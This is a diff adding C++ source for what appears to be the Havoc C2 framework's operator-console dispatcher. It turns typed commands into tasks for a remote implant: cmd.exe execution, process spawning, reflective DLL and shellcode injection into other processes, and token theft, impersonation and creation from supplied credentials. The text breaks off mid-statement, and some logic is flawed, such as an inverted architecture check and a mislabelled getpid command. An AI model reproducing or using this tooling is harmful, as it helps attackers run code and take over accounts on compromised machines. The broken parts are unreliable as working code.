@@ -1,0 +1,1596 @@
+#include <global.hpp>
+
+#include <Havoc/DemonCmdDispatch.h>
+#include <UserInterface/Widgets/DemonInteracted.h>
+#include <Util/ColorText.h>
+#include <Util/ColorText.h>
+#include <Havoc/Packager.hpp>
+
+#include <sstream>
+#include <vector>
+#include <iomanip>
+
+using namespace HavocNamespace::HavocSpace;
+using namespace Util;
+
+template<typename ... Args>
+auto string_format( const std::string& format, Args ... args ) -> std::string
+{
+    int size_s = std::snprintf( nullptr, 0, format.c_str(), args ... ) + 1; // Extra space for '\0'
+    if( size_s <= 0 ){ throw std::runtime_error( "Error during formatting." ); }
+    auto size = static_cast<size_t>( size_s );
+    std::unique_ptr<char[]> buf( new char[ size ] );
+    std::snprintf( buf.get(), size, format.c_str(), args ... );
+    return std::string( buf.get(), buf.get() + size - 1 ); // We don't want the '\0' inside
+}
+
+auto operator * ( string a, unsigned int b ) -> string
+{
+    auto output = string( "" );
+
+    while ( b-- )
+        output += a;
+
+    return output;
+}
+
+static auto JoinAtIndex( QStringList list, int index ) -> QString
+{
+    QString string;
+
+    int size = list.size();
+    for ( int i = 0; i < ( size - index ); i++ )
+    {
+        if ( i == 0 )
+            string.append( list[ index + i ] );
+        else
+            string.append( " " + list[ index + i ] );
+    }
+
+    return string;
+}
+
+auto ParseQuotes( QString commandline ) -> QStringList
+{
+    auto iss           = std::istringstream( commandline.toStdString() );
+    auto s             = std::string();
+    auto InputCommands = QStringList();
+
+    while ( iss >> std::quoted( s ) )
+        InputCommands << QString(s.c_str());
+
+    return InputCommands;
+}
+
+DemonCommands::DemonCommands( )
+{
+    Execute.DemonCommandInstance = this;
+}
+
+auto DemonCommands::SetDemonConsole( UserInterface::Widgets::DemonInteracted* pInteracted ) -> void
+{
+    this->DemonConsole = pInteracted;
+}
+
+auto DemonCommands::DispatchCommand( bool Send, QString TaskID, const QString& commandline ) -> bool
+{
+    auto InputCommands = commandline.split(" ");
+    auto IsDemonAgent  = false;
+    auto AgentData     = ServiceAgent();
+    auto Prompt        = QString();
+
+    // check if it's a generic demon or 3rd party agent
+
+    if ( MagicValue == DemonMagicValue )
+    {
+        IsDemonAgent = true;
+    }
+    else
+    {
+        for ( auto& agent : HavocX::Teamserver.ServiceAgents )
+        {
+            if ( MagicValue == agent.MagicValue )
+            {
+                AgentData = agent;
+                AgentTypeName = agent.Name;
+            }
+        }
+    }
+
+    if ( IsDemonAgent )
+    {
+        if ( InputCommands[ 0 ].compare( "help" ) == 0 )
+        {
+            if ( InputCommands.size() > 1 && InputCommands[ 1 ] != "" )
+            {
+                bool FoundCommand = false;
+                for ( auto & commandIndex : DemonCommandList )
+                {
+                    if ( InputCommands[ 1 ].compare( commandIndex.CommandString ) == 0 )
+                    {
+                        FoundCommand = true;
+                        if ( ! commandIndex.SubCommands.empty() && InputCommands.size() > 2 && InputCommands[ 2 ] != "" )
+                        {
+                            bool FoundSubCommand = false;
+
+                            for ( auto & SubCommand : commandIndex.SubCommands )
+                            {
+                                auto SubCommandString = SubCommand.CommandString;
+
+                                if ( InputCommands[ 2 ].compare( SubCommandString ) == 0 )
+                                {
+                                    FoundSubCommand = true;
+
+                                    DemonConsole->Console->append( "" );
+                                    DemonConsole->Console->append( " - Module        :  " + commandIndex.CommandString );
+                                    DemonConsole->Console->append( " - Sub Command   :  " + SubCommand.CommandString );
+                                    DemonConsole->Console->append( " - Description   :  " + SubCommand.Description );
+
+                                    if ( ! SubCommand.Behavior.isEmpty() )
+                                        DemonConsole->Console->append( " - Behavior      :  " + SubCommand.Behavior );
+
+                                    if ( ! SubCommand.Usage.isEmpty() )
+                                        DemonConsole->Console->append( " - Usage         :  " + commandIndex.CommandString + " "+ SubCommand.CommandString + " " + SubCommand.Usage );
+
+                                    if ( ! SubCommand.Example.isEmpty() )
+                                        DemonConsole->Console->append( " - Example       :  " + commandIndex.CommandString + " "+ SubCommand.CommandString + " " + SubCommand.Example );
+                                    /*
+                                    if ( ! SubCommand.Usage.isEmpty() )
+                                        DemonConsole->Console->append( " - Required Args :  " + QString( to_string( SubCommand.Usage.split( " " ).size() ).c_str() ) );*/
+
+                                    if ( ! SubCommand.Options.isEmpty() )
+                                    {
+                                        DemonConsole->Console->append( " - Options       :  " );
+                                        for ( auto& Option : SubCommand.Options )
+                                            DemonConsole->Console->append( "      " + Option);
+                                    }
+
+                                    break;
+                                }
+                            }
+
+                            if ( ! FoundSubCommand )
+                            {
+                                for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
+                                {
+                                    if ( InputCommands[ 1 ].compare( Command.Module.c_str() ) == 0 )
+                                    {
+                                        if ( InputCommands[ 2 ].compare( Command.Command.c_str() ) == 0 )
+                                        {
+                                            FoundSubCommand = true;
+
+                                            DemonConsole->Console->append( "" );
+                                            DemonConsole->Console->append( " - Module        :  " + QString( Command.Module.c_str() ) );
+                                            DemonConsole->Console->append( " - Sub Command   :  " + QString( Command.Command.c_str() ) );
+                                            DemonConsole->Console->append( " - Description   :  " + QString( Command.Help.c_str() ) );
+
+                                            // if ( Command.Behavior != 0 )
+                                            //     DemonConsole->Console->append( " - Behavior      :  " + SubCommand.Behavior );
+
+                                            if ( Command.Usage.c_str() )
+                                                DemonConsole->Console->append( " - Usage         :  " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Usage.c_str() ) );
+
+                                            if ( Command.Example.c_str() )
+                                                DemonConsole->Console->append( " - Example       :  " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Example.c_str() ) );
+
+                                            /*if ( ! QString( Command.Usage.c_str() ).isEmpty() )
+                                                DemonConsole->Console->append( " - Required Args :  " + QString( to_string( SubCommand.Usage.split( " " ).size() ).c_str() ) );*/
+                                        }
+                                    }
+                                }
+
+                                if ( ! FoundSubCommand )
+                                {
+                                    DemonConsole->Console->append( Util::ColorText::Red( "[-]" ) + " Couldn't find sub command in \"" + InputCommands[ 1 ] + "\": " + InputCommands[ 2 ] );
+                                }
+                            }
+
+                        }
+                        else
+                        {
+                            DemonConsole->Console->append( "" );
+                            DemonConsole->Console->append( " - Command       :  " + commandIndex.CommandString );
+                            DemonConsole->Console->append( " - Description   :  " + commandIndex.Description );
+
+                            if ( ! commandIndex.Behavior.isEmpty() )
+                                DemonConsole->Console->append( " - Behavior      :  " + commandIndex.Behavior );
+
+                            if ( ! commandIndex.Usage.isEmpty() )
+                                DemonConsole->Console->append( " - Usage         :  " + commandIndex.CommandString + " " + commandIndex.Usage );
+
+                            if ( ! commandIndex.Example.isEmpty() )
+                                DemonConsole->Console->append( " - Example       :  " + commandIndex.CommandString + " " + commandIndex.Example );
+
+                            if ( ! commandIndex.Usage.isEmpty() && commandIndex.SubCommands.empty() )
+                                DemonConsole->Console->append(" - Required Args :  " + QString(to_string(commandIndex.Usage.split(" ").size()).c_str()));
+
+                            if ( ! commandIndex.SubCommands.empty() )
+                            {
+                                if ( commandIndex.SubCommands[ 0 ].CommandString != nullptr )
+                                {
+                                    DemonConsole->Console->append( "" );
+                                    DemonConsole->Console->append( "  Command                        Description      " );
+                                    DemonConsole->Console->append( "  ---------                      -------------     " );
+
+                                    for ( auto & SubCommand : commandIndex.SubCommands )
+                                    {
+                                        if ( SubCommand.CommandString != nullptr )
+                                        {
+                                            int         TotalSize   = 31;
+                                            int         CmdSize     = SubCommand.CommandString.size();
+
+                                            if ( CmdSize > 31 )
+                                                CmdSize = 31;
+
+                                            std::string Spaces      = std::string( ( TotalSize - CmdSize ), ' ' );
+
+                                            DemonConsole->Console->append( "  " + SubCommand.CommandString + QString( Spaces.c_str() ) + SubCommand.Description );
+
+                                        }
+                                        /*if ( SubCommand.CommandString.length() >= 9 )
+                                            DemonConsole->Console->append("  " + SubCommand.CommandString + "    " + SubCommand.Description);
+                                        else
+                                            DemonConsole->Console->append("  " + SubCommand.CommandString + "        " + SubCommand.Description);*/
+                                    }
+
+                                    for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
+                                    {
+                                        if ( InputCommands[ 1 ].compare( Command.Module.c_str() ) == 0 )
+                                        {
+                                            int         TotalSize   = 24;
+                                            std::string Spaces      = std::string( ( TotalSize - Command.Command.size() ), ' ' );
+
+                                            DemonConsole->Console->append( "  " + QString( Command.Command.c_str() ) + QString( Spaces.c_str() ) + "Command" + "         " + QString( Command.Help.c_str() ) );
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        break;
+                    }
+                }
+
+                if ( ! FoundCommand )
+                {
+                    for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
+                    {
+                        if ( InputCommands[ 1 ].compare( Command.Command.c_str() ) == 0 )
+                        {
+                            FoundCommand = true;
+
+                            DemonConsole->Console->append( "" );
+                            DemonConsole->Console->append( " - Command       :  " + QString( Command.Command.c_str() ) );
+                            DemonConsole->Console->append( " - Description   :  " + QString( Command.Help.c_str() ) );
+
+                            if ( Command.Usage.c_str() )
+                                DemonConsole->Console->append( " - Usage         : " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Usage.c_str() ) );
+
+                            if ( Command.Example.c_str() )
+                                DemonConsole->Console->append( " - Example       : " + QString( Command.Module.c_str() ) + " " + QString( Command.Command.c_str() ) + " " + QString( Command.Example.c_str() ) );
+
+                        }
+                    }
+
+                    if ( ! FoundCommand )
+                        DemonConsole->Console->append( Util::ColorText::Red( "[-]" ) + " Couldn't find command: " + InputCommands[ 1 ] );
+                }
+            }
+            else
+            {
+                int TotalSize = 24;
+
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( "Demon Commands" );
+                DemonConsole->Console->append( "==============" );
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( "  Command                 Type         Description" );
+                DemonConsole->Console->append( "  -------                 -------      -----------" );
+
+                for ( auto & i : DemonCommandList )
+                {
+                    if ( ! i.SubCommands.empty() )
+                    {
+                        std::string Spaces = std::string("&nbsp;") * ( TotalSize - i.CommandString.size() );
+                        if ( i.SubCommands[ 0 ].CommandString != nullptr )
+                        {
+                            // DemonConsole->Console->insertHtml( "<br>" + QString( ( std::string("&nbsp;") * 2 ).c_str() ) + i.CommandString + QString( Spaces.c_str() ) + i.Description + Util::ColorText::Red( " [module]" ) + "&nbsp;" );
+                            DemonConsole->Console->append( "  " + i.CommandString + QString( std::string( ( TotalSize - i.CommandString.size() ), ' ' ).c_str() ) + "Module " + "      " +  i.Description );
+                        }
+                        else
+                        {
+                            DemonConsole->Console->append( "  " + i.CommandString + QString( std::string( ( TotalSize - i.CommandString.size() ), ' ' ).c_str() ) + "Command" + "      "  + i.Description );
+                        }
+                    }
+                    else
+                    {
+                        std::string Spaces = std::string( ( TotalSize - i.CommandString.size() ), ' ' );
+                        DemonConsole->Console->append( "  " + i.CommandString + QString( std::string( ( TotalSize - i.CommandString.size() ), ' ' ).c_str() ) + "Command" + "      "  + i.Description );
+                    }
+                }
+
+                for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
+                {
+                    int         TotalSize   = 24;
+                    std::string Spaces      = std::string( ( TotalSize - Command.Command.size() ), ' ' );
+
+                    if ( Command.Module.empty() )
+                        DemonConsole->Console->append( "  " + QString( Command.Command.c_str() ) + QString( Spaces.c_str() ) + "Command" + "      " + QString( Command.Help.c_str() ) );
+                }
+            }
+
+            return true;
+        }
+        else if ( InputCommands[ 0 ].compare( "sleep" ) == 0 )
+        {
+            TaskID = CONSOLE_INFO( "Tasked demon to sleep for " + InputCommands[ 1 ] + " seconds" );
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Sleep( TaskID, InputCommands[ 1 ] ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "checkin" ) == 0 )
+        {
+            TaskID = CONSOLE_INFO( "Tasked demon send back a checkin request" );
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.Checkin( TaskID ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "job" ) == 0 )
+        {
+            if ( InputCommands.size() == 1 )
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError( "Not enough arguments" );
+                return false;
+            }
+
+            if ( InputCommands[ 1 ].compare( "list" ) == 0 )
+            {
+                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list jobs" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Job( TaskID, "list", "0" ) )
+            }
+            else if ( InputCommands[ 1 ].compare( "suspend" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    TaskID = CONSOLE_INFO( "Tasked demon to suspend job: " + InputCommands[ 2 ] );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.Job( TaskID, "suspend", InputCommands[ 2 ] ) )
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                }
+            }
+            else if ( InputCommands[ 1 ].compare( "resume" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    TaskID = CONSOLE_INFO( "Tasked demon to resume job: " + InputCommands[ 2 ] );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.Job( TaskID, "resume", InputCommands[ 2 ] ) )
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                }
+            }
+            else if ( InputCommands[ 1 ].compare( "kill" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    TaskID = CONSOLE_INFO( "Tasked demon to kill job: " + InputCommands[ 2 ] );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.Job( TaskID, "kill", InputCommands[ 2 ] ) )
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                }
+            }
+            else
+            {
+                CONSOLE_ERROR( "Sub command not found: " + InputCommands[ 1 ] )
+            }
+        }
+        else if (InputCommands[0].compare( "dir" ) == 0)
+        {
+            auto Path = QString( "" );
+
+            if ( InputCommands.size() == 1 )
+            {
+                Path = ".";
+                TaskID = CONSOLE_INFO( "Tasked demon to list current directory" );
+            }
+            else
+            {
+                if ( InputCommands[ 1 ] == "" )
+                {
+                    Path = ".";
+                    TaskID = CONSOLE_INFO( "Tasked demon to list current directory" );
+                }
+                else
+                {
+                    Path = JoinAtIndex( InputCommands, 1 );
+                    TaskID = CONSOLE_INFO( "Tasked demon to list directory: " + Path );
+                }
+            }
+
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.FS( TaskID, "dir", Path ) );
+        }
+        else if (InputCommands[0].compare( "cd" ) == 0)
+        {
+            if ( InputCommands.size() < 1 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" );
+                return false;
+            }
+
+            auto Path = JoinAtIndex( InputCommands, 1 );
+            TaskID = CONSOLE_INFO( "Tasked demon to change directory: " + Path );
+
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.FS( TaskID, "cd", Path ) );
+        }
+        else if (InputCommands[0].compare( "remove" ) == 0)
+        {
+            if ( InputCommands.size() < 1 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" );
+                return false;
+            }
+
+            auto Path = JoinAtIndex( InputCommands, 1 );
+            TaskID = CONSOLE_INFO( "Tasked demon to remove file or directory: " + Path );
+
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.FS( TaskID, "remove", Path ) );
+        }
+        else if (InputCommands[0].compare( "mkdir" ) == 0)
+        {
+            auto Path = JoinAtIndex( InputCommands, 1 );
+            TaskID = CONSOLE_INFO( "Tasked demon to create new directory: " + Path );
+
+            if ( InputCommands.size() < 1 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" );
+                return false;
+            }
+
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.FS( TaskID, "mkdir", Path ) );
+        }
+        else if ( InputCommands[0].compare( "pwd" ) == 0)
+        {
+            TaskID = CONSOLE_INFO( "Tasked demon to get current working directory" );
+            CommandInputList[ TaskID ] = commandline;
+            SEND( Execute.FS( TaskID, "pwd", "" ) );
+        }
+        else if ( InputCommands[ 0 ].compare( "shell" ) == 0 )
+        {
+            if ( InputCommands.length() > 1 )
+            {
+                auto Args = QString( R"(c:\windows\system32\cmd.exe /c )" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
+
+                TaskID = CONSOLE_INFO( "Tasked demon to execute a shell command" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.ProcModule( TaskID, 4, "0;;FALSE;TRUE;" + Args ) )
+            }
+            else
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError( "Not enough arguments" );
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "proc" ) == 0 )
+        {
+            if ( InputCommands.size() == 1 )
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError( "Not enough arguments" );
+                return false;
+            }
+            if ( InputCommands[ 1 ].compare( "list" ) == 0 )
+            {
+                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to enumerate and list all processes" );
+                CommandInputList[ TaskID ] = commandline;
+                if ( Send ) Execute.ProcList( TaskID, false );
+
+            }
+            else if ( InputCommands[ 1 ].compare( "getpid" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to kill a process" );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    if ( Send )
+                        Execute.ProcModule( TaskID, 1, InputCommands[ 2 ] );
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Not enough arguments" );
+                }
+            }
+            else if ( InputCommands[ 1 ].compare( "modules" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list all modules/dll of a remote process" );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    if ( Send )
+                        Execute.ProcModule( TaskID, 2, InputCommands[ 2 ] );
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Not enough arguments" );
+                }
+            }
+
+            else if ( InputCommands[ 1 ].compare( "grep" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to grep information about the specified process" );
+                    CommandInputList[TaskID] = commandline;
+
+                    if ( Send )
+                        Execute.ProcModule( TaskID, 3, InputCommands[ 2 ] );
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Not enough arguments" );
+                }
+            }
+
+            else if ( InputCommands[ 1 ].compare( "create" ) == 0 )
+            {
+                if ( InputCommands.length() >= 4 )
+                {
+                    auto Args = QString();
+
+                    if ( InputCommands[ 2 ].compare( "normal" ) == 0 )
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process: " + InputCommands[ 3 ] );
+                        InputCommands[ 2 ] = "0";
+                    }
+                    else if ( InputCommands[ 2 ].compare( "suspended" ) == 0 )
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to spawn a process in suspended state: " + InputCommands[ 3 ] );
+                        InputCommands[ 2 ] = "4";
+                    }
+                    else
+                    {
+                        CONSOLE_ERROR( "Process creation flag not found: " + InputCommands[ 3 ] )
+                        return false;
+                    }
+
+                    if ( InputCommands.length() > 4 )
+                        Args = InputCommands[ 4 ].toUtf8().toBase64();
+
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.ProcModule( TaskID, 4, InputCommands[ 2 ] + ";" + InputCommands[ 3 ] + ";TRUE;FALSE;" + Args ) )
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Not enough arguments" );
+                }
+            }
+
+            else if ( InputCommands[ 1 ].compare( "blockdll" ) == 0 )
+            {
+                if ( InputCommands.length() >= 3 )
+                {
+                    if ( InputCommands[ 2 ].compare( "on" ) == 0 )
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to enable blocking non microsoft signed dlls" );
+                    }
+                    else if ( InputCommands[ 2 ].compare( "off" ) == 0 )
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to disable blocking non microsoft signed dlls" );
+                    }
+                    else
+                    {
+                        CONSOLE_ERROR( "Argument not valid" );
+                        return false;
+                    }
+
+                    CommandInputList[TaskID] = commandline;
+
+                    SEND( Execute.ProcModule( TaskID, 5, InputCommands[ 2 ] ) )
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Not enough arguments" );
+                }
+            }
+
+            else if (InputCommands[ 1 ].compare( "kill" ) == 0)
+            {
+                DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to kill a process" );
+            }
+            else if ( InputCommands[ 1 ].compare( "memory" ) == 0 )
+            {
+                if ( InputCommands.size() > 2 )
+                {
+                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to query for" + InputCommands[ 3 ] + " memory regions from " + InputCommands[ 2 ] );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    if ( Send )
+                        Execute.ProcModule( TaskID, 6, InputCommands[ 2 ] + " " + InputCommands[ 3 ] );
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Argument not valid" );
+
+                    return false;
+                }
+            }
+            else
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError("Module command not found !!");
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "dll" ) == 0 )
+        {
+            if ( InputCommands.size() == 1 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+            if ( InputCommands[ 1 ].compare( "inject" ) == 0 )
+            {
+                // dll inject [target pid] [/path/to/shellcode.x64.bin]
+                if ( InputCommands.size() < 4 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+
+                auto Pid  = InputCommands[ 2 ];
+                auto Path = InputCommands[ 3 ];
+                auto Args = QString();
+
+                if ( InputCommands.size() > 4 )
+                {
+                    Args = JoinAtIndex( InputCommands, 4 );
+                }
+
+                if ( ! QFile::exists( Path ) )
+                {
+                    CONSOLE_ERROR( "Specified reflective dll file not found" )
+                    return false;
+                }
+
+                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to inject a reflective dll: " + Path );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.DllInject( TaskID, Pid, Path, Args ) )
+            }
+            else if ( InputCommands[ 1 ].compare( "spawn" ) == 0 )
+            {
+                // dll spawn [path] [arguments]
+                if ( InputCommands.size() < 3 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+
+                auto Path = InputCommands[ 2 ];
+                auto Args = QString();
+
+                if ( InputCommands.size() >= 3 )
+                {
+                    Args = JoinAtIndex( InputCommands, 3 );
+                }
+
+                if ( ! QFile::exists( Path ) )
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError("Specified reflective dll file not found !!");
+                    return false;
+                }
+
+                TaskID = DemonConsole->TaskInfo(Send, nullptr, "Tasked demon to spawn a reflective dll: " + Path);
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.DllSpawn( TaskID, Path, Args.toLocal8Bit() ) )
+
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "shellcode" ) == 0 )
+        {
+            if ( InputCommands.size() == 1 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+            if ( InputCommands[ 1 ] .compare( "inject" ) == 0 )
+            {
+                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to inject shellcode into a remote process" );
+
+                if ( InputCommands.size() >= 5 )
+                {
+                    auto TargetArch = InputCommands[ 2 ];
+                    auto TargetPID  = InputCommands[ 3 ];
+                    auto Shellcode  = QString( ( InputCommands.begin() + 4 )->toStdString().c_str() );
+
+                    if ( ! QFile::exists( Shellcode ) )
+                    {
+                        DemonConsole->Console->append( "" );
+                        DemonConsole->Console->append( Prompt );
+                        DemonConsole->TaskError( "Specified file not found !" );
+                        return false;
+                    }
+
+                    if ( ! ( TargetArch.compare( "x64" ) == 0 || TargetArch.compare( "x86" ) != 0 ) )
+                    {
+                        DemonConsole->Console->append( "" );
+                        DemonConsole->Console->append( Prompt );
+                        DemonConsole->TaskError( "Incorrect process arch specified: " + TargetArch );
+                        return false;
+                    }
+
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.ShellcodeInject( TaskID, "0", TargetPID, TargetArch, Shellcode, "" ) );
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+            }
+            else if ( InputCommands[ 1 ].compare( "spawn" ) == 0 )
+            {
+                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to fork and inject shellcode" );
+
+                if ( InputCommands.size() >= 2 )
+                {
+                    auto TargetArch = InputCommands[ 2 ];
+
+                    QString ShellcodeBinaryPath = ( InputCommands.begin() + 3 )->toStdString().c_str();
+
+                    if ( ! ( TargetArch.compare( "x64" ) == 0 || TargetArch.compare( "x86" ) != 0 ) )
+                    {
+                        CONSOLE_ERROR( "Incorrect process arch specified: " + TargetArch )
+                        return false;
+                    }
+
+                    if ( ! QFile::exists( ShellcodeBinaryPath ) )
+                    {
+                        CONSOLE_ERROR( "Couldn't find specified binary: " + ShellcodeBinaryPath )
+                        return false;
+                    }
+
+                    CommandInputList[ TaskID ] = commandline;
+                    SEND( Execute.ShellcodeSpawn( TaskID, "0", TargetArch, ShellcodeBinaryPath, "" ); )
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+            }
+        }
+
+        // NOTE: this function is only for debug purpose only. don't forget to remove this on final release
+        else if ( InputCommands[0].compare( "__debug" ) == 0 )
+        {
+            if (InputCommands.size() == 1)
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+            if (InputCommands[1].compare("dump-text") == 0)
+            {
+                QFile filecontent("/tmp/TextEdit-dump.txt");
+                filecontent.open(QFile::Append | QFile::Text);
+                filecontent.write(DemonConsole->Console->toPlainText().toStdString().c_str());
+                filecontent.close();
+            }
+            else if (InputCommands[1].compare("dump-html") == 0)
+            {
+                QFile filecontent("/tmp/TextEdit-dump-html.html");
+                filecontent.open(QFile::Append | QFile::Text);
+                filecontent.write(DemonConsole->Console->toHtml().toStdString().c_str());
+                filecontent.close();
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "token" ) == 0 )
+        {
+            if ( InputCommands.size() < 2 )
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+            if ( InputCommands[ 1 ].compare( "impersonate" ) == 0 )
+            {
+                if ( InputCommands.size() < 3 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+
+                auto TokenID = InputCommands[ 2 ];
+
+                TaskID = CONSOLE_INFO( "Tasked demon to impersonate a process token" );
+                CommandInputList[TaskID] = commandline;
+
+                SEND( Execute.Token( TaskID, "impersonate", TokenID ); )
+            }
+            else if ( InputCommands[ 1 ].compare( "steal" ) == 0 )
+            {
+                if ( InputCommands.size() < 3 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+
+                auto TargetProcessID = InputCommands[ 2 ];
+                TaskID = CONSOLE_INFO( "Tasked demon to steal a process token" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Token( TaskID, "steal", TargetProcessID ) );
+            }
+            else if ( InputCommands[ 1 ].compare( "list" ) == 0 )
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to list token vault" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Token( TaskID, "list", "" ) );
+            }
+            else if ( InputCommands[ 1 ].compare( "make" ) == 0 )
+            {
+                // token make Domain\user password
+                auto LocalNet   = QString();
+                auto DomainUser = QString();
+                auto Password   = QString();
+
+                if ( InputCommands.size() >= 5 )
+                {
+                    LocalNet   = InputCommands[ 2 ];
+                    DomainUser = InputCommands[ 3 ];
+                    Password   = InputCommands[ 4 ];
+
+                    if ( ( LocalNet.compare( "local" ) == 0 ) || ( LocalNet.compare( "network" ) == 0 ) )
+                    {
+                        TaskID = CONSOLE_INFO( "Tasked demon to make a new " + LocalNet + " user token" );
+                        CommandInputList[ TaskID ] = commandline;
+
+                        SEND( Execute.Token( TaskID, "make", LocalNet + ";" + DomainUser.toLocal8Bit().toBase64() + ";" + Password.toLocal8Bit().toBase64() ) );
+                    }
+                    else
+                    {
+                        CONSOLE_ERROR( "Not enough arguments" )
+                        return false;
+                    }
+
+                } else {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+            }
+            else if ( InputCommands[ 1 ].compare( "revert" ) == 0 )
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to revert the process token" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Token( TaskID, "revert", "" ) );
+            }
+            else if ( InputCommands[ 1 ].compare( "remove" ) == 0 )
+            {
+                if ( InputCommands.size() < 3 )
+                {
+                    CONSOLE_ERROR( "Not enough arguments" )
+                    return false;
+                }
+
+                auto TargetProcessID = InputCommands[ 2 ];
+
+                TaskID                     = CONSOLE_INFO( "Tasked demon to remove a token from the token vault" );
